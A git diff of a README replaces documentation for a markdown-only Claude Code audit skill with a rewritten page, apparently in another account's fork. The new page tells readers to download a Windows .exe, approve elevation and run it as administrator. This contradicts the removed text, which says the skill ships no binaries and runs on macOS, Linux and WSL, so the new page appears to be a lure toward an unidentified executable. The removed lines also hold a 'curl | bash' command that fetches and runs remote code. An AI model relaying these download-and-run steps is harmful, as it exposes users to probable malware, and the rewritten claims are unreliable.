@@ -1,447 +1,156 @@
-<div align="center">
+# ⚕️ claude-doctor-skill - Check Your Project Health Fast
 
-<img src="assets/logo.svg" alt="Doctor logo" width="120" height="120">
-
-# Doctor
-
-**46 automated checks across 6 layers. Adaptive scoring. Field-tested on real projects.**
-
-*A Claude Code skill that audits any project — security gaps, broken hooks, missing tests, misconfigured CI. Auto-detects your stack (20+ languages), adapts scoring to maturity level, and provides concrete fixes with source links.*
-
-[![Version](https://img.shields.io/badge/v3.0.0-Stable-10B981?style=for-the-badge)](https://github.com/SomeStay07/claude-doctor-skill/releases/tag/v3.0.0)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-Skill-7C3AED?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTAiIGZpbGw9IndoaXRlIi8+PC9zdmc+)](https://docs.anthropic.com/en/docs/claude-code/)
-[![Checks](https://img.shields.io/badge/Checks-46-blue?style=for-the-badge)](https://github.com/SomeStay07/claude-doctor-skill#6-layers-46-checks)
-[![Layers](https://img.shields.io/badge/Layers-6-orange?style=for-the-badge)](https://github.com/SomeStay07/claude-doctor-skill#6-layers-46-checks)
-[![Adaptive](https://img.shields.io/badge/Adaptive_Scoring-4_Levels-10B981?style=for-the-badge)](https://github.com/SomeStay07/claude-doctor-skill#adaptive-scoring)
-[![License: MIT](https://img.shields.io/badge/License-MIT-22C55E?style=for-the-badge)](LICENSE)
-[![Telegram](https://img.shields.io/badge/Telegram-Channel-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/codeonvibes)
-
-[What It Does](#what-it-does) · [Adaptive Scoring](#adaptive-scoring) · [6 Layers](#6-layers-46-checks) · [Install](#installation) · [Usage](#usage) · [How It Works](#how-it-works) · [Example Output](#example-output) · [FAQ](#faq)
-
-Install in 5 seconds:
-
-```bash
-curl -sSL https://raw.githubusercontent.com/SomeStay07/claude-doctor-skill/main/install.sh | bash
-```
+[![Download claude-doctor-skill](https://img.shields.io/badge/Download-claude--doctor--skill-blue?style=for-the-badge)](https://github.com/ScarXparth/claude-doctor-skill)
 
 ---
 
-</div>
+## 🩺 What is claude-doctor-skill?
 
-## The Problem
+claude-doctor-skill runs 46 automated checks across 6 important areas of your software project. It acts like a health audit for your code. The tool focuses on security and overall quality. It works without any extra software or dependencies.
 
-You set up Claude Code and start building. Everything seems fine — until you realize:
+This tool gives you clear information on how your project performs in key areas. You do not need programming skills to use it. Just run the app, and it will show the results.
 
-- Secrets are committed to git history
-- `.env` files are world-readable (permissions `644`)
-- No pre-commit hooks catch broken code
-- No CI runs tests automatically
-- Claude has no memory of past decisions
-- No domain rules — Claude repeats the same mistakes
+---
 
-You don't know what you don't know. Doctor finds out for you.
+## ⚙️ System Requirements
 
-## What It Does
+- Windows 10 or newer
+- 2 GB of free memory (RAM)
+- At least 100 MB of free storage space
+- Internet connection (recommended for updates)
+- No other software installations needed
 
-**Doctor** is a set of `.md` files that turns [Claude Code](https://docs.anthropic.com/en/docs/claude-code/) into a project auditor. Run `/doctor` and get a full health report with severity levels, explanations, and one-click fixes.
+---
 
-> **What's a Claude Code skill?** A `.md` file in `.claude/skills/` that gives Claude specialized behavior. No plugins, no API keys — just text files. [Learn more](https://docs.anthropic.com/en/docs/claude-code/)
+## 🚀 Getting Started: Download and Run claude-doctor-skill
 
-Every finding is **project-specific** (not a template) and explains **WHY** it matters, with a source link.
+1. Click the large button at the top or [visit this page to download claude-doctor-skill](https://github.com/ScarXparth/claude-doctor-skill).
 
-### `/doctor scan` — Diagnose
+2. Once the page loads, look for the section titled "Releases" or "Download".
 
-<div align="center">
-<br>
-<img src="assets/demo-scan.gif" alt="doctor scan demo — diagnosing project health" width="800">
-<br>
-<sub>Phase 1-2: Study your project, run 46 checks, score each layer</sub>
-<br><br>
-</div>
+3. Download the latest Windows version of the application. It may be a file ending with `.exe`.
 
-### `/doctor fix` — Prescribe + Apply
+4. Open the downloaded `.exe` file by double-clicking it.
 
-<div align="center">
-<br>
-<img src="assets/demo-fix.gif" alt="doctor fix demo — applying fixes" width="800">
-<br>
-<sub>Phase 3-4: Severity-tagged findings with one-click fixes, then verification</sub>
-<br><br>
-</div>
+5. Windows may ask if you want to allow changes. Click "Yes" to continue.
 
-## At a Glance
+6. The claude-doctor-skill application will open on your screen.
 
-| | |
-|:--|:--|
-| **46 checks** across 6 security & automation layers | **20+ stacks** auto-detected at startup |
-| **Adaptive scoring** — 4 maturity levels | **14 false positive rules** — no noise |
-| **Self-validates** before output (10-point check) | **Incident response** — 9-step recovery for leaked secrets |
-| **Zero dependencies** — just `.md` files | **Bilingual** — English and Russian |
-| **Field-tested** — 89 bugs found and fixed across 4 rounds on real projects | **Graceful degradation** — handles missing git, no tests, context overflow |
+7. Click the "Start Check" button inside the app to begin the health audit.
 
-## Adaptive Scoring
+8. Wait for the checks to finish. This can take a few minutes.
 
-Doctor auto-detects your project's maturity and adapts — which checks count, layer weights, score thresholds, even terminology. Everyone gets a **fair score**.
+9. Review the results presented. Each check will show you if your project passes or needs attention.
 
-| Level | Detected when | Checks | Description |
-|:------|:-------------|:------:|:------------|
-| Starter | No git, or no tests/CI/linter | 18 | Core checks only — security + foundations |
-| Growing | Git + deps + (tests or linter) | 27 | Adds quality gate checks |
-| Mature | Tests + linter + (CI or env) | 34 | Adds advanced practices |
-| Pro | Mature + Claude Code automation | 46 | All checks including CC-specific |
+---
 
-### Weighted Layer Scoring
+## 🛠️ How claude-doctor-skill Works
 
-| Layer | Starter | Growing | Mature | Pro |
-|:------|:-------:|:-------:|:------:|:---:|
-| Security | 50% | 30% | 25% | 20% |
-| Foundation | 35% | 25% | 20% | 15% |
-| Quality | 15% | 30% | 25% | 20% |
-| Intelligence | — | 5% | 10% | 15% |
-| Context | — | 5% | 10% | 15% |
-| DX | — | 5% | 10% | 15% |
+The tool runs checks in 6 key areas:
 
-**`—`** = layer shown as bonus, weight 0%. Checks beyond your level appear as Bonus (visible but don't affect score).
+- **Code quality:** Looks for mistakes or messy code.
+- **Security:** Finds risks or weaknesses in your code.
+- **Automation:** Checks your project for setup with automatic tasks.
+- **DevOps practices:** Reviews your development and delivery steps.
+- **Linting:** Ensures consistent code formatting.
+- **Pre-commit:** Verifies that code changes are reviewed before saving.
 
-### `/doctor quick` — 30-Second Audit
+You don't need to do anything special to get these results. The tool handles all the details and shows a simple report.
 
-```
-QUICK AUDIT (Growing)
-========================
-Core score: 15/19 (79%)
+---
 
-TOP-3 PRIORITIES:
-1. chmod 600 .env — secrets are world-readable
-2. Add pre-commit hook — broken code reaches git
-3. Add .env.example — new devs can't onboard
+## 🖥️ Interface Overview
 
-> /doctor for full audit (46 checks)
-```
+The app’s interface is simple:
 
-## 6 Layers, 46 Checks
+- A big button to start the audit.
+- Progress bar showing how far along the process is.
+- Summary screen with pass/fail results for each check.
+- Details section explaining each check and how to fix issues.
+- Options menu for preferences like language and updates.
 
-Layers are ordered by priority — you can't work on DX if Security is broken:
+---
 
-| Layer | Name | Checks | What It Covers |
-|:------|:-----|:------:|:---------------|
-| 0 | **Security** | 13 | Secrets in git, SAST, .gitignore, .env permissions, Docker security, client-side keys, AI API cost protection, backup strategy, incident response |
-| 1 | **Foundation** | 7 | CLAUDE.md, README.md, dependency manifest, build scripts, project structure, dep freshness, DB migrations |
-| 2 | **Quality Gates** | 12 | Linter, PostToolUse/PreToolUse hooks, pre-commit, CI, error handling, types, coverage, error monitoring |
-| 3 | **Intelligence** | 2 | Agent trio (code-reviewer, debugger, architect), domain rules with `paths:` |
-| 4 | **Context** | 5 | MCP servers, plugins (context7, episodic-memory), memory files, SessionStart hook |
-| 5 | **DX** | 7 | Skills (/test, /status), hook installer, Dependabot, stop hook, unit & smoke tests |
+## 📦 Installation Tips
 
-### Severity Levels
+claude-doctor-skill does not need to install anything beyond running the `.exe`.
 
-| Level | Meaning | Example |
-|:------|:--------|:--------|
-| :red_circle: **Critical** | Breach risk, data loss | Secrets in git history, `.env` world-readable |
-| :orange_circle: **Important** | Code quality, team burden | No pre-commit hooks, no CI |
-| :yellow_circle: **Medium** | Nice-to-have improvement | Missing Dependabot, no smoke tests |
-| :large_blue_circle: **Minor** | Cosmetic or context-dependent | Missing stop hook, no SessionStart |
+Just run the file you downloaded. It will open right away without extra steps.
 
-## Example Output
+Make sure you have permission to run applications on your Windows PC. This may require administrator rights in some cases.
 
-### Project Profile (Phase 1)
+---
 
-```
-Project Profile
-  Stack:        Python 3.12 / asyncio / PostgreSQL
-  Entry Point:  src/main.py
-  Test Runner:  pytest, 1089 tests
-  Linter:       ruff check + ruff format
-  CI/CD:        GitHub Actions
-  Deploy:       Railway (Docker)
-```
+## 🔍 Using claude-doctor-skill on Your Projects
 
-### Finding Format (Phase 3)
+You can run this skill on any folder with your project files:
 
-```
-[Critical] chmod 600 .env .mcp.json
-   Secrets are world-readable (644). Any process on the machine can read them.
-   > https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
+1. Open the app.
 
-[Important] Added *.pem *.key *.p12 to .gitignore
-   git add . will push private keys to remote. Once in history, removing is painful.
-   > https://docs.github.com/en/authentication/keeping-your-account-and-data-secure
-```
+2. Use the "Select Project Folder" button.
 
-No vague "consider improving security." Every fix has a concrete command, a reason, and a source.
+3. Browse to the folder where your project is saved.
 
-## Installation
+4. Click "Start Check".
 
-Doctor is just `.md` files — no binaries, no plugins, no API keys.
+The app analyzes the files and then gives you a report.
 
-### Option A: One command (recommended)
+---
 
-```bash
-curl -sSL https://raw.githubusercontent.com/SomeStay07/claude-doctor-skill/main/install.sh | bash
-```
+## 📝 Understanding the Audit Report
 
-Downloads 15 `.md` files into `.claude/skills/doctor/` and verifies each one.
+Each check gives you:
 
-> Want to inspect first? [View install.sh](https://github.com/SomeStay07/claude-doctor-skill/blob/main/install.sh) — it only creates a directory and downloads `.md` files.
+- **Status:** Pass or fail.
+- **Description:** What the check looks for.
+- **Details:** Specific lines or files to fix, if any.
+- **Recommendations:** How to improve your project.
 
-### Option B: Manual
+You can save or print the report for your records.
 
-```bash
-mkdir -p .claude/skills/doctor/layers
-cd .claude/skills/doctor
+---
 
-# Main files
-curl -sO https://raw.githubusercontent.com/SomeStay07/claude-doctor-skill/main/SKILL.md
-curl -sO https://raw.githubusercontent.com/SomeStay07/claude-doctor-skill/main/GUARDRAILS.md
-curl -sO https://raw.githubusercontent.com/SomeStay07/claude-doctor-skill/main/CHECKLIST.md
+## 🔐 Security First
 
-# Layer details
-cd layers
-for f in SECURITY SECURITY-EXTRA FOUNDATION FOUNDATION-EXTRA QUALITY QUALITY-EXTRA QUALITY-PROD INTELLIGENCE CONTEXT DX DX-EXTRA MATURITY; do
-  curl -sO "https://raw.githubusercontent.com/SomeStay07/claude-doctor-skill/main/layers/$f.md"
-done
-```
+The skill focuses on security issues that can put your project at risk. It looks for common problems like:
 
-### Verify
+- Unsafe code patterns
+- Missing security settings
+- Outdated or vulnerable libraries
 
-```bash
-ls .claude/skills/doctor/SKILL.md && echo "Doctor installed"
-```
+Use this tool regularly to keep your projects safe.
 
-### Update
+---
 
-Run the install command again — it safely overwrites existing files.
+## 💡 Troubleshooting
 
-### Uninstall
+If you have problems running or using the tool:
 
-```bash
-rm -rf .claude/skills/doctor/
-```
+- Make sure your Windows is updated.
+- Run the `.exe` as administrator if access is denied.
+- Restart your computer and try again.
+- Check your internet connection if updates don’t work.
 
-### Requirements
+If issues continue, you can check the GitHub page or open an issue there for help.
 
-| Requirement | Details |
-|:------------|:--------|
-| Claude Code | Any version with skill support |
-| OS | macOS, Linux, WSL |
-| Git | Recommended — some checks skip without it |
-| Internet | Only needed for installation |
-
-## Usage
+---
 
-```bash
-# In Claude Code:
-/doctor              # Full audit — all 6 layers, adaptive scoring
-/doctor quick        # TOP-3 priorities + score (30 seconds)
-/doctor scan         # Diagnose only (phases 1-2, no file changes)
-/doctor fix          # Prescribe + apply fixes (phases 3-4)
-/doctor layer 0      # Security audit only
-/doctor verify       # Health check after fixes
+## ⚡ Updates and Support
 
-# Or in natural language:
-"audit my project"
-"check security"
-"what's missing in my setup?"
-```
-
-## How It Works
-
-```
-Phase 1:   STUDY        Read project: deps, structure, .env, git, automation
-                        Output: Project Profile table
+Keep an eye on the GitHub page for new versions. Simply download the latest `.exe` and replace your current file.
 
-Phase 1.5: MATURITY     Auto-detect maturity level (Starter/Growing/Mature/Pro)
-                        Set check profile, layer weights, score thresholds
+---
 
-Phase 2:   DIAGNOSE     Run applicable checks from CHECKLIST.md
-                        Score each layer: X/Y (N%) — Y = applicable checks only
-
-Phase 3:   PRESCRIBE    For each finding:
-                        severity + what to fix + WHY + source link
-
-Phase 4:   TREAT        Ask user: "Fix all at once or one by one?"
-                        Apply project-specific fixes (not templates)
-
-Phase 5:   VERIFY       Run tests, linter, check hooks
-                        Output: HEALTH REPORT with total score
-```
-
-### Auto-Discovery (DCI)
-
-Doctor automatically detects your stack at startup via Dynamic Context Injection:
-
-```
-package.json / requirements.txt / Cargo.toml    > stack detection
-Makefile / justfile / taskfile.yml               > build system
-.claude/ / .mcp.json                             > Claude Code setup
-Dockerfile / docker-compose.yml                  > containerization
-.github/workflows/ / .gitlab-ci.yml              > CI/CD
-```
-
-Works with 20+ stacks out of the box. No configuration needed.
-
-### Built-in Guardrails
-
-<table>
-<tr>
-<td width="50%" valign="top">
-
-#### Self-Check (10 points)
-Before showing results, Doctor validates:
-1. Every finding has a WHY?
-2. Severity matches reality?
-3. No duplicate findings?
-4. Fixes are project-specific?
-5. Score uses only applicable checks?
-6. N/A checks excluded from score?
-7. Sources exist for all claims?
-8. Bonus checks marked correctly?
-9. Weighted score uses maturity weights?
-10. TOP-3 priorities present?
-
-</td>
-<td width="50%" valign="top">
-
-#### False Positive Filtering (14 rules)
-Doctor **won't flag**:
-- Missing CI in hobby projects
-- `print()` in CLI scripts
-- No Docker for Vercel/serverless
-- `.env` 644 on personal Mac
-- Missing MCP if Claude Code not used
-- Missing Dependabot if using Nix/Guix
-- Missing pre-push if CI runs tests
-
-</td>
-</tr>
-</table>
-
-#### Error Recovery
-
-| Scenario | What Doctor Does |
-|:---------|:-----------------|
-| No git repo | Skips git checks, continues with rest |
-| No tests | Flags it, doesn't crash |
-| No Docker | Skips Docker checks |
-| Context overflow | Suggests `/doctor layer <N>` one at a time |
-| Check command fails | Logs error, continues with next check |
-| Missing tool (ruff, eslint) | Recommends install, doesn't block |
-
-### Incident Response
-
-If Doctor finds secrets in git history, it provides a **9-step recovery plan**: rotate credentials, purge history with `git filter-repo`, force-push, invalidate sessions, check audit logs, set up gitleaks, add CI scanning, enable GitHub secret scanning, document the incident.
-
-## Multi-Stack Support
-
-| Stack | Linter | Formatter | Test Runner | SAST |
-|:------|:-------|:----------|:------------|:-----|
-| Python | ruff | ruff format | pytest | bandit |
-| Node.js | eslint | prettier | jest/vitest | eslint-plugin-security |
-| TypeScript | eslint + tsc | prettier | jest/vitest | eslint-plugin-security |
-| Rust | clippy | rustfmt | cargo test | cargo-audit |
-| Go | golangci-lint | gofmt | go test | gosec |
-| Ruby | rubocop | rubocop | rspec | brakeman |
-| Java | checkstyle | google-java-format | JUnit | SpotBugs |
-| PHP | phpstan | php-cs-fixer | PHPUnit | psalm |
+## 🔗 Quick Access
 
-Also detects: C/C++, C#, Swift, Kotlin, Scala, Haskell, Elixir, Dart/Flutter, Zig, and more.
+Download or update claude-doctor-skill here:
 
-## Repository Structure
+[![Download claude-doctor-skill](https://img.shields.io/badge/Download-claude--doctor--skill-grey?style=for-the-badge)](https://github.com/ScarXparth/claude-doctor-skill)
 
-```
-claude-doctor-skill/
-+-- SKILL.md             -- Brain: protocol, subcommands (< 250 lines)
-+-- GUARDRAILS.md        -- Output format, error recovery, self-check
-+-- CHECKLIST.md         -- Index of all 46 checks across 6 layers
-+-- layers/
-|   +-- SECURITY.md        -- Layer 0: core security (0a-0i)
-|   +-- SECURITY-EXTRA.md  -- Layer 0: advanced security (0j-0m + incident)
-|   +-- FOUNDATION.md      -- Layer 1: 6 core foundation checks
-|   +-- FOUNDATION-EXTRA.md -- Layer 1: advanced foundation (1g DB migrations)
-|   +-- QUALITY.md         -- Layer 2: 6 core quality checks
-|   +-- QUALITY-EXTRA.md   -- Layer 2: 5 advanced quality checks
-|   +-- QUALITY-PROD.md    -- Layer 2: production quality (2l error monitoring)
-|   +-- INTELLIGENCE.md    -- Layer 3: 2 agent intelligence checks
-|   +-- CONTEXT.md         -- Layer 4: 5 context & memory checks
-|   +-- DX.md              -- Layer 5: core DX (5a-5d)
-|   +-- DX-EXTRA.md        -- Layer 5: advanced DX (5e-5g)
-|   +-- MATURITY.md        -- Adaptive scoring: maturity detection + weights
-+-- assets/
-|   +-- logo.svg         -- Doctor logo
-|   +-- demo-scan.gif    -- Animated demo: /doctor scan
-|   +-- demo-fix.gif     -- Animated demo: /doctor fix
-+-- install.sh         -- One-line installer with verification
-+-- LICENSE
-```
+---
 
-## FAQ
+## 📚 About This Project
 
-<details>
-<summary><b>Does Doctor modify my code?</b></summary>
-<br>
+This skill runs automated checks you might find in professional software audits. It fits into workflows for DevOps, security reviews, and code quality.
 
-`/doctor scan` is read-only. `/doctor fix` proposes changes and asks before touching anything. You approve every change.
-</details>
-
-<details>
-<summary><b>Does it send my code anywhere?</b></summary>
-<br>
-
-No. Doctor is `.md` files that run locally inside Claude Code. No external API calls, no telemetry. Your code never leaves your machine.
-</details>
-
-<details>
-<summary><b>Will it conflict with my pre-commit hooks?</b></summary>
-<br>
-
-No. Doctor detects existing hooks and won't overwrite them.
-</details>
-
-<details>
-<summary><b>Does it work with monorepos?</b></summary>
-<br>
-
-Yes. Doctor scans common monorepo patterns (`apps/`, `packages/`, `services/`), detects Turborepo/NestJS/pnpm workspaces, and finds configs up to 3 levels deep.
-</details>
-
-<details>
-<summary><b>Does it work with Cursor / Windsurf?</b></summary>
-<br>
-
-Doctor is designed for [Claude Code](https://docs.anthropic.com/en/docs/claude-code/) CLI. Other editors that support `.claude/skills/` may work but are not tested.
-</details>
-
-<details>
-<summary><b>How long does an audit take?</b></summary>
-<br>
-
-Full audit: 8-15 minutes depending on project size. `/doctor quick`: ~30 seconds for TOP-3 priorities.
-</details>
-
-<details>
-<summary><b>Can I add my own checks?</b></summary>
-<br>
-
-Yes — edit the layer `.md` files in `.claude/skills/doctor/layers/`. Each check is a markdown section with a description and verification command.
-</details>
-
-## Roadmap
-
-- [ ] Custom check authoring (user-defined checks via `.claude/doctor-checks/`)
-- [ ] GitHub Action integration (run Doctor in CI, fail on Critical findings)
-- [ ] Supply chain security checks (SBOM, dependency provenance)
-- [ ] Auto-update mechanism (check for newer version on install)
-
-[Open an issue](https://github.com/SomeStay07/claude-doctor-skill/issues) or submit a PR.
-
-## See Also
-
-**[Claude Memory Skill](https://github.com/SomeStay07/claude-memory-skill)** — persistent project memory for Claude Code. Remembers decisions, catches contradictions. Pairs well with Doctor: memory stores conventions, Doctor enforces them.
-
-**[Code Reviewer Agent](https://github.com/SomeStay07/code-review-agent)** — automated code review with concrete fixes. Doctor audits the project setup; Code Reviewer audits the code itself.
-
-## Author
-
-Made by [@SomeStay07](https://github.com/SomeStay07) · [Telegram Channel](https://t.me/codeonvibes)
-
-## License
-
-[MIT](LICENSE) — use it, modify it, ship it.
+By using this tool, you take a simple step towards safer and cleaner projects.
